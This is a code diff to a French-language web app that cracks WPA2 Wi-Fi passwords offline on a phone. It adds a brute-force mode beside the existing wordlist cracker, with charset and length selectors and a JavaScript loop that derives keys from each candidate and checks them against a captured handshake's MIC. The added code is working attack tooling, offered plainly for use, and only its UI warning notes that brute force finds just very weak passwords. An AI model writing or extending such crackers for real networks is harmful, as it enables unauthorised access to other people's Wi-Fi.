@@ -43,6 +43,9 @@
   .big{font-size:18px;font-weight:700}
   #log{background:#000;color:#9fe39f;font:12px/1.35 ui-monospace,Menlo,Consolas,monospace;
        padding:8px;border-radius:10px;max-height:180px;overflow:auto;white-space:pre-wrap;margin:6px 0}
+  select.f,input.f{min-height:38px;border:0;border-radius:10px;background:var(--card2);color:var(--txt);
+       font-size:14px;padding:0 8px}
+  input.f{width:58px;text-align:center}
   .grid2{display:grid;grid-template-columns:1fr 1fr;gap:8px}
   .kpi{background:var(--card2);border-radius:10px;padding:10px}
   .kpi .v{font-size:22px;font-weight:800} .kpi .l{color:var(--muted);font-size:12px}
@@ -109,8 +112,21 @@
           <button class="sm primary" id="btnCrack" disabled>Cracker (tél)</button>
           <button class="sm" id="btnCrackStop">Stop</button>
         </div>
+        <div class="row" style="margin-top:8px">
+          <span class="sub">Brute :</span>
+          <select id="bfCharset" class="f">
+            <option value="123">0-9</option>
+            <option value="abc">a-z</option>
+            <option value="abc123" selected>a-z 0-9</option>
+            <option value="all">A-z 0-9</option>
+          </select>
+          <input id="bfMin" class="f" type="number" value="8" min="1" max="12" title="long. min">
+          <input id="bfMax" class="f" type="number" value="8" min="1" max="12" title="long. max">
+          <button class="sm primary" id="btnBrute">Brute-force</button>
+        </div>
         <div id="crkInfo" class="mono big" style="margin-top:8px">—</div>
-        <div class="sub" style="margin-top:4px">Crack <b>sur le téléphone</b> (WebCrypto), hors-ligne. WPA2/CCMP.</div>
+        <div class="sub" style="margin-top:4px">Crack <b>sur le téléphone</b> (WebCrypto), hors-ligne. WPA2/CCMP.
+          ⚠️ WPA = 8 car. min → le brute-force ne tombe que sur un mot de passe très faible.</div>
       </div>
     </div>
 
@@ -339,6 +355,35 @@ async function startCrack(){
       $('#crkInfo').textContent=`${i.toLocaleString('fr')}/${words.length} · ${r}/s`; await new Promise(res=>setTimeout(res)); } }
   $('#crkInfo').textContent = i>=words.length?`Épuisé — non trouvé (${words.length} testés)`:`Arrêté (${i} testés)`; crackRun=false;
 }
+const CHARSETS={ '123':'0123456789','abc':'abcdefghijklmnopqrstuvwxyz',
+  'abc123':'abcdefghijklmnopqrstuvwxyz0123456789',
+  'all':'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789' };
+async function startBrute(){
+  if(!(HS&&HS.ea)){ $('#crkInfo').textContent='Pas de handshake.'; return; }
+  if(HS.ver==='1'){ $('#crkInfo').textContent='TKIP (ver 1) non supporté.'; return; }
+  const cs=CHARSETS[$('#bfCharset').value]||CHARSETS.abc123;
+  let lmin=Math.max(1,+$('#bfMin').value||8), lmax=Math.max(lmin,+$('#bfMax').value||lmin);
+  const aa=hex2b(HS.aa),spa=hex2b(HS.spa),an=hex2b(HS.an),sn=hex2b(HS.sn),mic=hex2b(HS.mic),ea=hex2b(HS.ea);
+  crackRun=true; let i=0; const t0=performance.now();
+  for(let L=lmin; L<=lmax && crackRun; L++){
+    const idx=new Array(L).fill(0);
+    for(;;){
+      if(!crackRun) break;
+      let w=''; for(let k=0;k<L;k++) w+=cs[idx[k]];
+      const m=await micOf(await pmkOf(w,HS.ssid),aa,spa,an,sn,ea);
+      if(cmp(m,mic)===0){ $('#crkInfo').innerHTML=`🔓 TROUVÉ : <span style="color:var(--ok)">${esc(w)}</span>`; crackRun=false; return; }
+      i++;
+      if(i%50===0){ const r=Math.round(i/((performance.now()-t0)/1000));
+        $('#crkInfo').textContent=`${i.toLocaleString('fr')} essais · ${r}/s · L=${L} · "${w}"`;
+        await new Promise(res=>setTimeout(res)); }
+      let pos=L-1; while(pos>=0){ if(++idx[pos]<cs.length) break; idx[pos]=0; pos--; }
+      if(pos<0) break;
+    }
+  }
+  if(crackRun) $('#crkInfo').textContent=`Épuisé — non trouvé (${i.toLocaleString('fr')} testés)`;
+  crackRun=false;
+}
+$('#btnBrute').onclick=startBrute;
 $('#btnGetHs').onclick=()=>{ hsReq=true; send('hs'); };
 $('#wl').addEventListener('change', async e=>{ const f=e.target.files[0]; if(!f) return;
   words=(await f.text()).split(/\r?\n/).map(s=>s.trim()).filter(Boolean); status(`Wordlist : ${words.length} mots`); updateCrackBtn(); });
